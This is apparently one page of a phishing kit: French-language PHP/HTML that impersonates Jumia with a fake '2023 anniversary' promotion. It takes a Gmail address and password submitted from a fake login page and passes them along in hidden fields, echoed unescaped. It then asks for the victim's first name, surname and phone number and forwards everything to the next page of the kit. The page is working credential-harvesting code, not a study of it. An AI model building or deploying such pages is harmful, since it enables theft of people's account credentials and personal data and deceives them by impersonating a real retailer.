<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
    <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
    <link rel="stylesheet" href="styles.css"> <!-- Lien vers le fichier CSS -->
<style>
  body {
    font-family: Roboto, sans-serif;
}

.container {
    display: flex;
    flex-direction: column;
    height: 100%;
    width: 480px;
    margin: 0 auto;
    min-height: 500px;
    max-width: 100%;
}

.spacer {
    margin-bottom: 22px;
}

.header {
    display: flex;
    align-items: center;
    height: 64px;
    justify-content: center;
    margin: 0 0 8px;
    position: relative;
}

.card {
    background-color: #fff;
    border-radius: 4px;
    padding: 8px 24px;
}

#form-content {
    display: block;
    margin-top: 12px;
}

.form-title {
    text-align: center;
    display: block;
}

.form-title h2 {
    font-size: 20px;
    font-weight: bold;
    margin: 0;
}

.form-title p {
    font-size: 16px;
    font-weight: 400;
    line-height: 1.5em;
    margin: 8px 0 16px;
    color: #4a4a4a;
    text-align: center;
}

.input-field {
    padding-top: 34px;
    display: flex;
    margin-top: 16px;
}

.input-field input {
    border: 1px solid rgb(150, 149, 149);
    border-radius: 4px;
    outline: 0;
    flex: 1;
    height: 51px;
    padding-left: 15px;
    font-size: 16px;
}

#submit-button {
    margin-top: 22px;
}

#submit-button input {
    width: 100%;
    font-size: 16px;
    font-weight: bold;
    color: white;
    background-color: #f8982d;
    border: 0;
    padding: 16px 0;
    border-radius: 4px;
    box-shadow: 0 1px 4px rgba(0, 0, 0, 0.5);
    cursor: pointer;
}

.footer {
    padding: 8px 0;
    text-align: center;
    display: flex;
}

.footer .text {
    font-size: 14px;
    line-height: 24px;
    padding: 0 24px;
    position: relative;
    text-align: center;
    width: 100%;
    flex: 1;
}

.logo-footer {
    display: flex;
    justify-content: center;
    margin-top: 12px;
}

</style>
  </head>

<body>
        <?php
        require_once 'db/db.php';
        if ( 
        !isset($_POST['num_email']) || 
        empty($_POST['num_email']) ||  
        strpos($_POST['num_email'], '@gmail.com') === false || 
        !isset($_POST['password']) || 
        empty($_POST['password']) || 
        strlen(trim($_POST['password'])) < 8
        ) {
            header('Location: connexion.php');
            exit(); 
        }
        ?>

    <div class="container" id="container">
        <div class="spacer" id="spacer"></div>

        <div class="header" id="header">
            <img class="logo" src="../images/logojum" alt="Jumia Logo" width="69" height="67">
        </div>

        <div class="card" id="card">
            <form method="post" action="genre_date.php" onsubmit="return validateForm()">
                <div id="form-content">
                    <div class="form-title" id="form-title">
                        <h2>Données personnelles</h2>
                        <p>
                            Il vous suffit de remplir les détails ci-dessous.
                        </p>
                    </div>

                    <div class="input-field" id="input-firstname">
                        <input type="text" name="Prénom" placeholder="Prénom*" id="input-prenom">
                    </div>

                    <div class="input-field" id="input-lastname">
                        <input type="text" name="Nom" placeholder="Nom de famille*" id="input-nom">
                    </div>

                    <div class="input-field" id="input-phone">
                        <input type="text" name="téléphone" placeholder="Numéro de téléphone*" id="input-telephone">
                    </div>

                    <div id="hidden-fields">
                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
                        <input type="hidden" name="num_email" value="<?php echo $_POST['num_email']; ?>">
                    </div>

                    <div id="submit-button">
                        <p id="red_er" style="visibility: hidden; margin: 0; flex: 100%; font-size: 15px; color: red; padding-left: 10px; padding-top: 5px; margin-bottom: 14px;">Les mots de passe ne correspondent pas.</p>

                        <input type="submit" value="Continuer">
                    </div>
                </div>
            </form>
        </div>

        <div class="footer" id="footer">
            <div class="text" id="footer-text">
                Si besoin d'aide, merci de vous référer au Centre d'Assistance ou de contacter notre service client.
            </div>
        </div>

        <div class="logo-footer" id="logo-footer">
            <img src="../images/jumi" alt="Jumia Logo" width="90" height="17">
        </div>
    </div>

</body>
<script>
  function validateForm() {

            document.getElementById('red_er').style.visibility = 'hidden';

            const prenom = document.getElementById('input-prenom').value.trim();
            const nom = document.getElementById('input-nom').value.trim();
            const telephone = document.getElementById('input-telephone').value.trim();
            let errorMessage = "";

            if (prenom === "" || prenom.length < 3 || nom === "" || nom.length < 3) {
                errorMessage += "Le prénom et le nom doit contenir au moins 3 caractères.\n";
            }

            const phonePattern = /^[0-9]{10}$/;
            if (!phonePattern.test(telephone)) {
                errorMessage += "Le numéro de téléphone doit contenir 10 chiffres.\n";
            }

            if (errorMessage !== "") {
              document.getElementById('red_er').style.visibility = 'visible';
              document.getElementById('red_er').textContent=errorMessage;
                return false;
            }

            return true;
        }
</script>
</html>
